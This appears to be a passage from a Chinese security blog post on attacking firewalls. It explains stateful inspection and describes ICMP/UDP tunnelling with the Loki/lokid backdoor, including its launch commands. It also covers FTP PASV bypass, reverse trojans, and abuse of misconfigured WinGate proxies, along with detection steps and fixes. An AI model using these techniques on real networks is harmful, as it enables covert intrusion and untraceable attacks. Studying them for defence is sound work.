&lt;p&gt;但是木马攻击的前提是必须先上传，运行木马，对于简单的包过滤防火墙来说，是容易做的。这里不写这个了。大概就是利用内部网络主机开放的服务漏洞。&lt;br /&gt;
　　&lt;br /&gt;
　　早期的防火墙都是这种简单的包过滤型的，到现在已很少了，不过也有。现在的包过滤采用的是状态检测技术，下面谈谈状态检测的包过滤防火墙。&lt;/p&gt;
&lt;h1 id=&#34;三-攻击状态检测的包过滤&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#三-攻击状态检测的包过滤&#34;&gt;&lt;/a&gt; 三 攻击状态检测的包过滤&lt;/h1&gt;
&lt;p&gt;状态检测技术最早是checkpoint提出的，在国内的许多防火墙都声称实现了状态检测技术。&lt;/p&gt;
&lt;p&gt;可是：）很多是没有实现的。到底什么是状态检测？&lt;/p&gt;
&lt;p&gt;一句话，状态检测就是从tcp连接的建立到终止都跟踪检测的技术。&lt;/p&gt;
&lt;p&gt;原先的包过滤，是拿一个一个单独的数据包来匹配规则的。可是我们知道，同一个tcp连接，他的数据包是前后关联的，先是syn包，-》数据包=》fin包。数据包的前后序列号是相关的。&lt;br /&gt;
　&lt;br /&gt;
　　如果割裂这些关系，单独的过滤数据包，很容易被精心够造的攻击数据包欺骗！！！如nmap的攻击扫描，就有利用syn包，fin包，reset包来探测防火墙后面的网络。！&lt;/p&gt;
&lt;p&gt;相反，一个完全的状态检测防火墙，他在发起连接就判断，如果符合规则，就在内存登记了这个连接的状态信息（地址，port，选项。。）,后续的属于同一个连接的数据包，就不需要在检测了。直接通过。而一些精心够造的攻击数据包由于没有在内存登记相应的状态信息，都被丢弃了。这样这些攻击数据包，就不能饶过防火墙了。&lt;/p&gt;
&lt;p&gt;说状态检测必须提到动态规则技术。在状态检测里，采用动态规则技术，原先高端口的问题就可以解决了。实现原理是：平时，防火墙可以过滤内部网络的所有端口(1-65535),外部攻击者难于发现入侵的切入点，可是为了不影响正常的服务，防火墙一但检测到服务必须开放高端口时，如（ftp协议，irc等），防火墙在内存就可以动态地天加一条规则打开相关的高端口。等服务完成后，这条规则就又被防火墙删除。这样，既保障了安全，又不影响正常服务，速度也快。！&lt;/p&gt;
&lt;p&gt;一般来说，完全实现了状态检测技术防火墙，智能性都比较高，一些扫描攻击还能自动的反应，因此，攻击者要很小心才不会被发现。&lt;/p&gt;
&lt;p&gt;但是，也有不少的攻击手段对付这种防火墙的。&lt;/p&gt;
&lt;h2 id=&#34;1-协议隧道攻击&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1-协议隧道攻击&#34;&gt;&lt;/a&gt; 1 协议隧道攻击&lt;/h2&gt;
&lt;p&gt;协议隧道的攻击思想类似与VPN的实现原理，攻击者将一些恶意的攻击数据包隐藏在一些协议分组的头部，从而穿透防火墙系统对内部网络进行攻击。&lt;/p&gt;
&lt;p&gt;例如，许多简单地允许ICMP回射请求、ICMP回射应答和UDP分组通过的防火墙就容易受到ICMP和UDP协议隧道的攻击。Loki和lokid（攻击的客户端和服务端）是实施这种攻击的有效的工具。在实际攻击中，攻击者首先必须设法在内部网络的一个系统上安装上lokid服务端，而后攻击者就可以通过loki客户端将希望远程执行的攻击命令（对应IP分组）嵌入在ICMP或UDP包头部，再发送给内部网络服务端lokid，由它执行其中的命令，并以同样的方式返回结果。由&lt;/p&gt;
&lt;p&gt;于许多防火墙允许ICMP和UDP分组自由出入，因此攻击者的恶意数据就能附带在正常的分组，绕过防火墙的认证，顺利地到达攻击目标主机下面的命令是用于启动lokid服务器程序：&lt;/p&gt;
&lt;p&gt;lokid-p–I–vl&lt;/p&gt;
&lt;p&gt;loki客户程序则如下启动：&lt;/p&gt;
&lt;p&gt;loki–d172.29.11.191(攻击目标主机)-p–I–v1–t3&lt;/p&gt;
&lt;p&gt;这样，lokid和loki就联合提供了一个穿透防火墙系统访问目标系统的一个后门。&lt;/p&gt;
&lt;h2 id=&#34;2-利用ftp-pasv绕过防火墙认证的攻击&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2-利用ftp-pasv绕过防火墙认证的攻击&#34;&gt;&lt;/a&gt; 2 利用FTP-pasv绕过防火墙认证的攻击&lt;/h2&gt;
&lt;p&gt;FTP-pasv攻击是针对防火墙实施入侵的重要手段之一。目前很多防火墙不能过滤这种攻击手段。如CheckPoint的Firewall-1，在监视FTP服务器发送给客户端的包的过程中，它在每个包中寻找&amp;quot;227&amp;quot;这个字符串。如果发现这种包，将从中提取目标地址和端口，并对目标地址加以验证，通过后，将允许建立到该地址的TCP连接。&lt;/p&gt;
&lt;p&gt;攻击者通过这个特性，可以设法连接受防火墙保护的服务器和服务。详细的描述可见：&lt;a href=&#34;http://www.checkpoint.com/techsupport/alerts/pasvftp.html%E3%80%82&#34;&gt;http://www.checkpoint.com/techsupport/alerts/pasvftp.html。&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;3-反弹木马攻击&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3-反弹木马攻击&#34;&gt;&lt;/a&gt; 3 反弹木马攻击&lt;/h2&gt;
&lt;p&gt;反弹木马是对付这种防火墙的最有效的方法。攻击者在内部网络的反弹木马定时地连接外部攻击者控制的主机，由于连接是从内部发起的，防火墙（任何的防火墙）都认为是一个合法的连接，因此基本上防火墙的盲区就是这里了。防火墙不能区分木马的连接和合法的连接。&lt;/p&gt;
&lt;p&gt;但是这种攻击的局限是：必须首先安装这个木马！！！所有的木马的第一步都是关键！！！&lt;/p&gt;
&lt;h1 id=&#34;四-攻击代理&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#四-攻击代理&#34;&gt;&lt;/a&gt; 四 攻击代理&lt;/h1&gt;
&lt;p&gt;代理是运行在应用层的防火墙，他实质是启动两个连接，一个是客户到代理，另一个是代理到目的服务器。&lt;/p&gt;
&lt;p&gt;实现上比较简单，和前面的一样也是根据规则过滤。由于运行在应用层速度比较慢/1&lt;/p&gt;
&lt;p&gt;攻击代理的方法很多。&lt;/p&gt;
&lt;p&gt;这里就以wingate为例，简单说说了。（太累了）&lt;/p&gt;
&lt;p&gt;WinGate是目前应用非常广泛的一种Windows95/NT代理防火墙软件，内部用户可以通过一台安装有WinGate的主机访问外部网络，但是它也存在着几个安全脆弱点。&lt;/p&gt;
&lt;p&gt;黑客经常利用这些安全漏洞获得WinGate的非授权Web、Socks和Telnet的访问，从而伪装成WinGate主机的身份对下一个攻击目标发动攻击。因此，这种攻击非常难于被跟踪和记录。&lt;br /&gt;
　　&lt;br /&gt;
　　导致WinGate安全漏洞的原因大多数是管理员没有根据网络的实际情况对WinGate代理防火墙软件进行合理的设置，只是简单地从缺省设置安装完毕后就让软件运行，这就给攻击者可乘之机。&lt;/p&gt;
&lt;h2 id=&#34;1-非授权web访问&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1-非授权web访问&#34;&gt;&lt;/a&gt; 1 非授权Web访问&lt;/h2&gt;
&lt;p&gt;某些WinGate版本（如运行在NT系统下的2.1d版本）在误配置情况下，允许外部主机完全匿名地访问因特网。因此，外部攻击者就可以利用WinGate主机来对Web服务器发动各种Web攻击（ 如CGI的漏洞攻击等），同时由于Web攻击的所有报文都是从80号Tcp端口穿过的，因此，很难追踪到攻击者的来源。&lt;/p&gt;
&lt;p&gt;检测&lt;/p&gt;
&lt;p&gt;检测WinGate主机是否有这种安全漏洞的方法如下：&lt;/p&gt;
&lt;p&gt;1) 以一个不会被过滤掉的连接（譬如说拨号连接）连接到因特网上。&lt;/p&gt;
&lt;p&gt;2) 把浏览器的代理服务器地址指向待测试的WinGate主机。&lt;/p&gt;
&lt;p&gt;如果浏览器能访问到因特网，则WinGate主机存在着非授权Web访问漏洞。&lt;/p&gt;
&lt;h2 id=&#34;2-非授权socks访问&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2-非授权socks访问&#34;&gt;&lt;/a&gt; 2 非授权Socks访问&lt;/h2&gt;
&lt;p&gt;在WinGate的缺省配置中，Socks代理（1080号Tcp端口）同样是存在安全漏洞。与打开的Web代理（80号Tcp端口）一样，外部攻击者可以利用Socks代理访问因特网。&lt;/p&gt;
&lt;p&gt;防范&lt;/p&gt;
&lt;p&gt;要防止攻击WinGate的这个安全脆弱点，管理员可以限制特定服务的捆绑。在多宿主（multi homed）系统上，执行以下步骤以限定如何提供代理服务。&lt;/p&gt;
&lt;p&gt;1选择Socks或WWWProxyServer属性。&lt;/p&gt;
&lt;p&gt;2选择Bindings标签。&lt;/p&gt;
&lt;p&gt;3按下ConnectionsWillBeAcceptedOnTheFollowingInterfaceOnly按钮，并指定本WinGate服务器的内部接口。&lt;/p&gt;
&lt;p&gt;非授权Telnet访问&lt;/p&gt;
&lt;p&gt;它是WinGate最具威胁的安全漏洞。通过连接到一个误配置的inGate服务器的Telnet服务，攻击者可以使用别人的主机隐藏自己的踪迹，随意地发动攻击。&lt;/p&gt;
&lt;p&gt;检测&lt;/p&gt;
&lt;p&gt;检测WinGate主机是否有这种安全漏洞的方法如下：&lt;/p&gt;
&lt;p&gt;1.使用telnet尝试连接到一台WinGate服务器。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;[root@happy/tmp]#&lt;/span&gt;&lt;span class=&#34;bash&#34;&gt;telnet172.29.11.191&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Trying172.29.11.191…. &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Connectedto172.29.11.191. &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Escapecharacteris‘^]&amp;#x27;. &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;Wingate&amp;gt;&lt;/span&gt;&lt;span class=&#34;bash&#34;&gt;10.50.21.5&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;2.如果接受到如上的响应文本，那就输入待连接到的网站。&lt;/p&gt;
&lt;p&gt;3.如果看到了该新系统的登录提示符，那么该服务器是脆弱的。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Connectedtohost10.50.21.5…Connected &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;SunOS5.6 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Login: &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;对策&lt;/p&gt;
&lt;p&gt;防止这种安全脆弱点的方法和防止非授权Socks访问的方法类似。在WinGate中简单地限制特定服务的捆绑就可以解决这个问题。一般来说，在多宿主（multihomed）系统管理员可以通过执行以下步骤来完成：&lt;/p&gt;
&lt;p&gt;1.选择TelnetSever属性。&lt;/p&gt;
&lt;p&gt;2.选择Bindings标签。&lt;/p&gt;
&lt;p&gt;3.按下ConnectionsWillBeAcceptedOnTheFollowingInterfaceOnly按钮，并指定本WinGate服务器的内部接口。&lt;/p&gt;
&lt;h1 id=&#34;五-后话&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#五-后话&#34;&gt;&lt;/a&gt; 五 后话&lt;/h1&gt;
&lt;p&gt;有防火墙的攻击不单是上面的一点，我有什么写的不对的，大家指正。&lt;/p&gt;
&lt;p&gt;一直以来，黑客都在研究攻击防火墙的技术和手段，攻击的手法和技术越来越智能化和多样化。但是就黑客攻击防火墙的过程上看，大概可以分为三类攻击。&lt;/p&gt;
&lt;p&gt;第一类攻击防火墙的方法是探测在目标网络上安装的是何种防火墙系统并且找出此防火墙系统允许哪些服务。我们叫它为对防火墙的探测攻击。&lt;/p&gt;
&lt;p&gt;第二类攻击防火墙的方法是采取地址欺骗、TCP序号攻击等手法绕过防火墙的认证机制，从而 对防火墙和内部网络破坏。&lt;/p&gt;
&lt;p&gt;第三类攻击防火墙的方法是寻找、利用防火墙系统实现和设计上的安全漏洞，从而有针对性地发动攻击。这种攻击难度比较大，可是破坏性很大。&lt;/p&gt;
</content>
        <category term="安全" />
        <updated>2021-03-28T10:39:27.000Z</updated>
    </entry>
</feed>
